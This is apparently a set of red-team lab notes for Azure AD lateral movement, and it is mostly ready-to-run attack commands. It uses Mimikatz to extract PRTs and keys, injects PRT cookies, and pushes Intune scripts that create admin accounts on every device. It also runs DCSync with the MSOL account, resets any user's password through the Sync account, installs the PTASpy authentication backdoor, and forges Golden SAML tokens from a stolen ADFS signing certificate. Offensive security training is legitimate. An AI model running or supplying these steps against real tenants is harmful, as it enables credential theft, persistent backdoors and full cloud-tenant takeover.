# Lateral movement

## Azure AD machine --> Azure (or another Azure AD Machine)
* [Pass the certificate](#Pass-the-certificate)
* [Pass the PRT](#Pass-the-PRT) 

## Azure AD --> On-prem
* [Intune](#Intune)
* [Application proxy abuse](#Application-proxy-abuse)

## On-Prem --> Azure AD
* [Azure AD Connect](#Azure-AD-Connect)
  * [Password Hash Sync (PHS) Abuse](#Password-Hash-Sync-Abuse)
  * [Pass Through Authentication (PTA) Abuse](#Pass-Through-Authentication-Abuse)
  * [Federation (ADFS)](#Federation-ADFS)

# Azure AD --> On-prem
## Pass the certificate
- To go from Azure AD machine to other Azure AD machine if the user has administrative access to other machines.

#### Check if machine is Azure AD Joined
- Check for IsDeviceJoined : YES
```
dsregcmd /status
```

#### Extract PRT, Session key (keyvalue) and Tenant ID
```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
```

#### Extract context key, clearkey and derived key
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<keyvalue> /unprotect" "exit"'
```

#### Request a certificate from PRT
- https://github.com/morRubin/PrtToCert
- Code is modified in the lab
```
& 'C:\Program Files\Python39\python.exe' RequestCert.py --tenantId <TENANT ID> --prt <PRT VALUE> --userName samcgray@defcorphq.onmicrosoft.com --hexCtx <CONTEXT KEY VALUE> --hexDerivedKey <DERIVED KEY VALUE>
```

#### Use certificate to add a user with administrative privileges
- Code is modified in the lab
- https://github.com/morRubin/AzureADJoinedMachinePTC
```
python C:\Users\vmuser\Documents\student38\AzureADJoinedMachinePTC\Main.py --usercert C:\Users\vmuser\Documents\student38\samcgray@defcorphq.onmicrosoft.com.pfx --certpass AzureADCert --remoteip 10.0.1.5 --command "cmd.exe /c net user student38 Stud38Password@123 /add /Y && net localgroup administrators student38 /add"
```

#### Use psremoting to access the machine

## Pass the PRT
#### Extract PRT, Session key (keyvalue) and Tenant ID
```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
```

#### Extract context key, clearkey and derived key
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<keyvalue> /unprotect" "exit"'
```

#### Request access token (cookie) to all applications
```
Import-Module .\AADInternals.psd1

$PRTOfMBarron = '<PRT>'
while($PRTOfMBarron.Length % 4) {$PRTOfMBarron += "="}
$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRTOfMBarron))

$ClearKey = "<CLEARKEY>"
$SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))

New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
```

- Can now also access portal.azure.com

#### Copy the value from above command and use it with a web browser
- Open the Browser in Incognito mode
- Go to https://login.microsoftonline.com/login.srf
- Press F12 (Chrome dev tools) -> Application -> Cookies
- Clear all cookies and then add one named `x-ms-RefreshTokenCredential` for https://login.microsoftonline.com and set its value to that retrieved from AADInternals
- Mark HTTPOnly and Secure for the cookie
- Visit https://login.microsoftonline.com/login.srf again and we will get access as the user!


## Intune
- a user with Global Administrator or Intune Administrator role can execute PowerShell scripts on an enrolled Windows device. The script runs with privileges of SYSTEM on the device.
- If user had Intune Administrator role go to https://endpoint.microsoft.com/#home and login (or from a ticket (PRT)
- Go to Devices -> All Devices to check devices enrolled to Intune:
- Go to Scripts and Click on Add for Windows 10. Create a new script and select a script
- Example script adduser.ps1
```
$passwd = ConvertTo-SecureString "Stud38Password@123" -AsPlainText -Force
New-LocalUser -Name student38 -Password $passwd
Add-LocalGroupMember -Group Administrators -Member student38
```
- Select `Run script in 64 bit PowerShell Host`
- On the assignment page select "Add all users" and "add all devices"

## Application proxy abuse
- The application behind the proxy may have vulnerabilities to access the on-prem environment.
#### Enumerate application which has a application proxy configured
```
Import-Module .\AzureAD.psd1
Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
```

#### Get the Service Principal (use the application name)
```
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "<APPLICATION NAME>"} 
```

#### Find user and groups assigned to the application
```
. .\Get-ApplicationProxyAssignedUsersAndGroups.ps1
Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT ID OF SERVICE PRINCIPAL>
```

#### Extract secrets of service account
- After compromising the application
```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
```

# On-Prem --> Azure AD
## Azure AD Connect
- Check if there is an account name with `MSOL_<INSTALLATION ID>`. This user has DCSYNC rights. (or `AAD_` if installed on a DC)
- Command to check if AD connect is installed on the server `Get-ADSyncConnector`

## Password Hash Sync Abuse
- Account with `SYNC_` is created in Azure AD and can reset any users password in Azure AD.
- Passwords for both the accounts are stored in SQL server on the server where Azure AD Connect is installed and it is possible to extract them in clear-text if you have admin privileges on the server.

#### Enumerate server where Azure AD is installed (on prem command)
```
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
```

#### Enumerate server where Azure AD is installed (Azure command)
```
Import-Module .\AzureAD.psd1
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```

#### Extract credentials from the server
```
Get-AADIntSyncCredentials
```

#### Run DCSync with creds of MSOL_* account
```
runas /netonly /user:defeng.corp\MSOL_782bef6aa0a9 cmd 
Invoke-Mimikatz -Command '"lsadump::dcsync/user:defeng\krbtgt /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
```

### Reset password of any user
- Using the Sync_* account we can reset password for any user. (Including Global Administrator and the user who created the tenant)

#### Using the creds, request an access token for AADGraph and save it to cache using the SYNC account.
```
$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_DEFENG-ADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
```

#### Enumerate global admin
```
Get-AADIntGlobalAdmins
```

#### Get the ImmutableID
```
Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
```

#### Reset the Azure password
```
Set-AADIntUserPassword -SourceAnchor "E2gG19HA4EaDe0+3LkcS5g==" -Password "SuperSecretpass#12321" -Verbose
```

#### Reset password for cloud only user
- Need CloudAnchor ID which is the format <USER>_<OBJECTID>
```
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
Set-AADIntUserPassword -CloudAnchor "User_10caa362-7d18-48c9-a45b-9c3a78f3a96b" -Password "SuperSecretpass#12321" -Verbose
```

- Access Azure portal using the new password.

## Pass Through Authentication PTA Abuse
- Once we have admin access to an Azure AD connect server running PTA agent.
- Not reliable method to check if PTA is used, Check if module is available ```Get-Command -Module PassthroughAuthPSModule```
- Once the backdoor is installed, we can authenticate as any user synced from on-prem without knowing the correct password!

#### Install a backdoor (needs to be run ad administrator)
```
Install-AADIntPTASpy
```

### See passwords of on-prem users authenticating
- Stored in C:\PTASpy
```
Get-AADIntPTASpyLog -DecodePasswords
```

#### Register a new PTA agent
- After getting Global Administrator privileges by setting it on a attacker controled machine.
```
Install-AADIntPTASpy
```

## Federation-ADFS
- Golden SAML Attack
#### Get the ImmutableID
```
[System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser | select -ExpandProperty ObjectGUID).tobytearray())
```

#### On ADFS server (As administrator)
```
Get-AdfsProperties |select identifier
```

#### Check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
```
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri
```

#### Extract the ADFS token signing certificate
- With DA privileges on-prem
```
Import-Module .\AADInternals.psd1
Export-AADIntADFSSigningCertificate
```

#### Access cloud apps as any user
```
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```

### With DA privileges on-prem, it is possible to create ImmutableID of cloud only users!
#### Create a realistic ImmutableID
```
[System.Convert]::ToBase64String((New-Guid).tobytearray())
```

#### Export the token signing certificate
```
Import-Module .\AADInternals.psd1
Export-AADIntADFSSigningCertificate
```

#### Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified 
```
Open-AADIntOffice365Portal -ImmutableID pwrtlmsicU+5tgCUgHx2tA== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
